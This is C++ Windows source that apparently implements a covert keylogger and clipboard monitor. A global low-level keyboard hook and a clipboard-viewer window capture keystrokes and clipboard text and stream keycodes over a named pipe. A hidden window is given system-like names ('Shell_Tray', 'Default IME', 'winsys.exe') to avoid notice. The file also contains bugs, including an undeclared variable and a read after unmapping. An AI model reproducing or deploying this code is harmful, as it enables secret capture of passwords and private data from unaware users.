#include "stdafx.h"
#include "eventhook.h"

#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <ostream>
#include <fstream>
#include <string>
#include <Tlhelp32.h>
#include <tchar.h>
#include <time.h>
#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <ostream>
#include <fstream>
#include <string>
#include <Tlhelp32.h>
#include <tchar.h>
#include <time.h>
#include  <shellapi.h>

using namespace std;

HWND hWndNextViewer;

string g_currentPath;
HANDLE g_handle;
HHOOK hookKeyboardLL = NULL;
bool bServiceStop = false;
string g_keyboardLogPath;
char *buffer;

HANDLE hKeyboardPipe;
HANDLE hClipboardPipe;

#define SERVICENAME "winsys.exe"

#define CURRENTPROCESNAME "mhg.exe"

#define KEYBOARD_PIPE_NAME "\\\\.\\pipe\\KeyboardDataPipe"
// #define CLIPBOARD_PIPE_NAME "\\\\.\\pipe\\ClipboardDataPipe"

static LRESULT CALLBACK KeyboardLLHookCallback(int nCode, WPARAM wParam, LPARAM lParam);

static const std::string currentDateTime() {
	time_t     now = time(0);
	struct tm  tstruct;
	char       buf[80];
	tstruct = *localtime(&now);
	strftime(buf, sizeof(buf), "%d/%m/%Y %X", &tstruct);
	return buf;
}

bool InitializeKeyboardLLHook()
{
	hookKeyboardLL = SetWindowsHookEx(
		WH_KEYBOARD_LL,
		(HOOKPROC)KeyboardLLHookCallback,
		0,
		0);
	return hookKeyboardLL != NULL;
}

void UninitializeKeyboardLLHook()
{
	if (hookKeyboardLL != NULL)
		UnhookWindowsHookEx(hookKeyboardLL);
	hookKeyboardLL = NULL;
}

// Structure for keyboard event data
typedef struct {
	DWORD keyCode;
	//BOOL isKeyDown;
} KeyboardEventData;

// Structure for clipboard event data
typedef struct {
	char buf[1024];
} ClipboardEventData;

// Shared memory structure
typedef struct {
	KeyboardEventData keyboardData;
	ClipboardEventData clipboardData;
	BOOL newKeyboardDataAvailable;
	BOOL newClipboardDataAvailable;
	HANDLE mutex;
} SharedMemoryData;

// Global shared memory data
SharedMemoryData* sharedData;

DWORD WINAPI WriteToPipelineThread(LPVOID lpParam) {
	while (1) {
		// Check if new keyboard data is available
		WaitForSingleObject(sharedData->mutex, INFINITE);
		BOOL newKeyboardData = sharedData->newKeyboardDataAvailable;
		KeyboardEventData keyboardData = sharedData->keyboardData;
		sharedData->newKeyboardDataAvailable = FALSE;

		if (newKeyboardData) {
			if (hKeyboardPipe != INVALID_HANDLE_VALUE) {

				DWORD bytesWritten;
				char buffer[256];
				sprintf_s(buffer, sizeof(buffer), "%lu,", keyboardData.keyCode);
				WriteFile(hKeyboardPipe, buffer, strlen(buffer), &bytesWritten, NULL);
			}
		}
		ReleaseMutex(sharedData->mutex);

		//WaitForSingleObject(sharedData->mutex, INFINITE);
		//BOOL newClipboardData = sharedData->newClipboardDataAvailable;
		//strcpy(buffer, sharedData->clipboardData.buf);
		//sharedData->newClipboardDataAvailable = FALSE;
		//if (newClipboardData) {
		//	if (hClipboardPipe != INVALID_HANDLE_VALUE) {
		//		DWORD bytesWritten;
		//		WriteFile(hClipboardPipe, buffer, strlen(buffer), &bytesWritten, NULL);
		//	}
		//}
		//ReleaseMutex(sharedData->mutex);

		// Sleep for a short duration to avoid busy-waiting
		Sleep(10);
	}

	return 0;
}

static LRESULT CALLBACK KeyboardLLHookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0 && (wParam == WM_KEYDOWN)) {
		// Retrieve keyboard event data
		KBDLLHOOKSTRUCT* keyboardInfo = (KBDLLHOOKSTRUCT*)lParam;
		DWORD keyCode = keyboardInfo->vkCode;
		//BOOL isKeyDown = (wParam == WM_KEYDOWN);

		// Write keyboard event data to shared memory
		WaitForSingleObject(sharedData->mutex, INFINITE);
		sharedData->keyboardData.keyCode = keyCode;
		//sharedData->keyboardData.isKeyDown = isKeyDown;
		sharedData->newKeyboardDataAvailable = TRUE;
		ReleaseMutex(sharedData->mutex);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

char* conver2char(LPWSTR wideStr)
{
	int numChars = WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, NULL, 0, NULL, NULL); // Get the number of characters required for the conversion
	char* multiByteStr = new char[numChars]; // Allocate a buffer for the multi-byte string
	WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, multiByteStr, numChars, NULL, NULL);
	return multiByteStr;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
	case WM_CREATE:
		// Add the window to the clipboard viewer chain
		hWndNextViewer = SetClipboardViewer(hwnd);
		break;
	case WM_CHANGECBCHAIN:
		// Pass the message to the next window in the clipboard viewer chain
		if ((HWND)wParam == hWndNextViewer) {
			hWndNextViewer = (HWND)lParam;
		}
		else if (hWndNextViewer != NULL) {
			SendMessage(hWndNextViewer, uMsg, wParam, lParam);
		}
		break;
	case WM_DRAWCLIPBOARD:
		// Handle the clipboard content change
		if (OpenClipboard(hwnd)) {
			HANDLE hData = GetClipboardData(CF_TEXT);
			if (hData != NULL) {
				char* pszText = static_cast<char*>(GlobalLock(hData));
				if (pszText != NULL) {
					// Process the clipboard text here
					WaitForSingleObject(sharedData->mutex, INFINITE);
					sharedData->newClipboardDataAvailable = TRUE;
					if (strlen(pszText) >= 1024) {
						strncpy(sharedData->clipboardData.buf, pszText, 1023);
						sharedData->clipboardData.buf[1023] = '\0';
					}
					else {
						strcpy(sharedData->clipboardData.buf, pszText);
					}
					ReleaseMutex(sharedData->mutex);
					GlobalUnlock(hData);
				}
			}
			CloseClipboard();
		}
		// Pass the message to the next window in the clipboard viewer chain
		if (hWndNextViewer != NULL) {
			SendMessage(hWndNextViewer, uMsg, wParam, lParam);
		}
		break;
	case WM_DESTROY:
		// Remove the window from the clipboard viewer chain
		ChangeClipboardChain(hwnd, hWndNextViewer);
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}
	return 0;
}

DWORD WINAPI hook(LPVOID lpParam)
{
	// Create shared memory
	HANDLE hMapFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, sizeof(SharedMemoryData), "SharedDataMemory");
	if (hMapFile == NULL) {
		// Handle shared memory creation error
		return 0;
	}

	// Map shared memory
	sharedData = (SharedMemoryData*)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(SharedMemoryData));
	if (sharedData == NULL) {
		// Handle shared memory mapping error
		CloseHandle(hMapFile);
		return 0;
	}

	// Initialize shared memory
	sharedData->newKeyboardDataAvailable = FALSE;
	sharedData->newClipboardDataAvailable = FALSE;
	sharedData->mutex = CreateMutex(NULL, FALSE, "SharedDataMutex");


	//create pipes
	//hClipboardPipe = CreateNamedPipe(CLIPBOARD_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_NOWAIT,
	//	PIPE_UNLIMITED_INSTANCES, 0, 0, 0, NULL);
	//if (hClipboardPipe == INVALID_HANDLE_VALUE) {
	//	//printf("Failed to create the mouse named pipe.\n");
	//	return 0;
	//}

	// Create the keyboard named pipe
	hKeyboardPipe = CreateNamedPipe(KEYBOARD_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_NOWAIT,
		PIPE_UNLIMITED_INSTANCES, 0, 0, 0, NULL);
	if (hKeyboardPipe == INVALID_HANDLE_VALUE) {
		//printf("Failed to create the keyboard named pipe.\n");
		return 0;
	}

	//printf("waiting for connect.\n");
	BOOL fConnected = false;
	while (!fConnected)
	{
		fConnected = ConnectNamedPipe(hKeyboardPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);


		Sleep(10);
	}

	//fConnected = false;
	//while (!fConnected)
	//{
	//	fConnected = ConnectNamedPipe(hClipboardPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
	//
	//	Sleep(10);
	//}

	// Create a separate thread for writing to the pipeline
	HANDLE hThread = CreateThread(NULL, 0, WriteToPipelineThread, NULL, 0, NULL);

	if (!InitializeKeyboardLLHook())
	{
		return 0;
	}

	if (hThread == NULL) {
		// Handle thread creation error
		UninitializeKeyboardLLHook();
		UnmapViewOfFile(sharedData);
		CloseHandle(hMapFile);
		if (sharedData->mutex)
		{
			CloseHandle(sharedData->mutex);
		}
		return 0;
	}

	buffer = new char[1024];
	const char CLASS_NAME[] = "Shell_Tray";

	WNDCLASS wc = {};
	wc.lpfnWndProc = WindowProc;
	wc.hInstance = NULL;
	wc.lpszClassName = CLASS_NAME;

	RegisterClass(&wc);

	hWndClipboard = (int)CreateWindowEx(
		0,
		CLASS_NAME,
		"Default IME",
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
		NULL,
		NULL,
		NULL,
		NULL
	);

	if (hWndClipboard == NULL) {
		return 0;
	}

	ShowWindow((HWND)hWndClipboard, SW_HIDE);

	MSG msg = {};
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// Clean up
	UninitializeKeyboardLLHook();
	UnmapViewOfFile(sharedData);
	CloseHandle(hMapFile);
	if (sharedData->mutex)
	{
		CloseHandle(sharedData->mutex);
	}
	CloseHandle(hThread);
	delete[] buffer;
	return 0;
}